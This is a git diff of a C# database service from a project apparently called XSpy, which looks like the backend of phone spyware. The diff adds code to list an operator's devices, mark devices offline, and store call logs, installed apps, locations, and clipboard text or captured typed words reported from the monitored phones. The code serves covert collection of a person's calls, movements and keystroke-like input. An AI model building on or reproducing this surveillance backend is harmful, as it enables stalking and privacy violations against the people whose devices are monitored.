@@ -1,15 +1,21 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Data.Entity;
+using Microsoft.EntityFrameworkCore;
 using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using CFCEad.Shared.Models.Response;
+using CFCEad.Shared.Models.Response.Devices.Search;
 using Microsoft.Extensions.Caching.Distributed;
+using XSpy.Database.Entities;
 using XSpy.Database.Entities.Devices;
+using XSpy.Database.Extensions;
+using XSpy.Database.Models.Tables;
 using XSpy.Database.Services.Base;
 using XSpy.Shared.Models.Requests.Devices;
+using XSpy.Shared.Models.Requests.Devices.Search;
 using File = XSpy.Database.Entities.Devices.File;
 
 namespace XSpy.Database.Services
@@ -20,9 +26,66 @@ namespace XSpy.Database.Services
         {
         }
 
+        public async Task<DataTableResponse<DeviceListResponse>> GetTable(DataTableRequest<SearchDeviceRequest> request,
+            User user)
+        {
+            var query = DbContext.Devices.AsQueryable();
+
+            var countTotal = await query.LongCountAsync();
+
+
+            if (request.Filter != null)
+            {
+                if (!string.IsNullOrEmpty(request.Filter.Model))
+                {
+                    query = query.Where(s => s.Model.ToUpper().Contains(request.Filter.Model.ToUpper()));
+                }
+            }
+
+            if (request.Search != null && !string.IsNullOrEmpty(request.Search.Value))
+            {
+                var search = request.Search.Value.ToUpper();
+                query = query.Where(s =>
+                    s.Model.ToUpper().Contains(search) || s.Manufacturer.ToUpper().Contains(search) ||
+                    s.DeviceId.ToUpper().Contains(search));
+            }
+
+            query = query.Where(s => s.UserId == user.Id);
+
+            var queryData = query.Select(s => new DeviceListResponse()
+            {
+                Id = s.Id,
+                Model = s.Model,
+                DeviceId = s.DeviceId,
+                IsActive = s.IsOnline,
+                LastUpdate = s.UpdatedAt
+            });
+
+            queryData = OrderResult(queryData, request);
+            var total = await queryData.LongCountAsync();
+            queryData = queryData.ApplyTableLimit(request);
+
+            return new DataTableResponse<DeviceListResponse>()
+            {
+                Data = await queryData.ToListAsync(),
+                Draw = request.Draw,
+                RecordsFiltered = total,
+                RecordsTotal = countTotal
+            };
+        }
+
+
         public Task<Device> GetDeviceById(Guid id)
         {
             return DbContext.Devices.FirstOrDefaultAsync(s => s.Id == id);
+        }
+
+        public async Task DisconnectDevice(string deviceId)
+        {
+            var device = await DbContext.Devices.Where(s => s.DeviceId == deviceId).FirstOrDefaultAsync();
+            device.IsOnline = false;
+            DbContext.Update(device);
+            await DbContext.SaveChangesAsync();
         }
 
         public async Task SaveDevice(Guid userId, SaveDeviceRequest request)
@@ -54,6 +117,8 @@ namespace XSpy.Database.Services
                 device.UpdatedAt = DateTime.Now;
                 DbContext.Update(device);
             }
+
+            await DbContext.SaveChangesAsync();
         }
 
         public async Task SaveCalls(string deviceId, SaveCallsRequest request)
@@ -83,7 +148,7 @@ namespace XSpy.Database.Services
                     Name = dataRequest.Name,
                     Number = dataRequest.PhoneNo,
                     Hash = hash,
-                    Date = dataRequest.Date,
+                    Date = JavaTimeStampToDateTime(dataRequest.Date),
                     Duration = dataRequest.Duration,
                     Type = dataRequest.Type
                 });
@@ -260,7 +325,8 @@ namespace XSpy.Database.Services
 
 
             DbContext.InstalledApps.RemoveRange(
-                DbContext.InstalledApps.Where(s => s.DeviceId == device));
+                DbContext.InstalledApps.Where(s =>
+                    s.DeviceId == device));
 
             foreach (var installedApp in request.Apps)
             {
@@ -303,6 +369,26 @@ namespace XSpy.Database.Services
             };
 
             await DbContext.Locations.AddAsync(loc);
+            await DbContext.SaveChangesAsync();
+        }
+
+        public async Task SaveWords(string deviceId, string word, bool isClipboard)
+        {
+            var device =
+                await DbContext.Devices.Where(s => s.DeviceId == deviceId).Select(s => s.Id)
+                    .FirstOrDefaultAsync();
+            if (device == Guid.Empty)
+                return;
+            var clip = new Clipboard()
+            {
+                Id = Guid.NewGuid(),
+                DeviceId = device,
+                CratedAt = DateTime.Now,
+                Content = word,
+                IsClipboard = isClipboard
+            };
+
+            await DbContext.Clipboards.AddAsync(clip);
             await DbContext.SaveChangesAsync();
         }
 
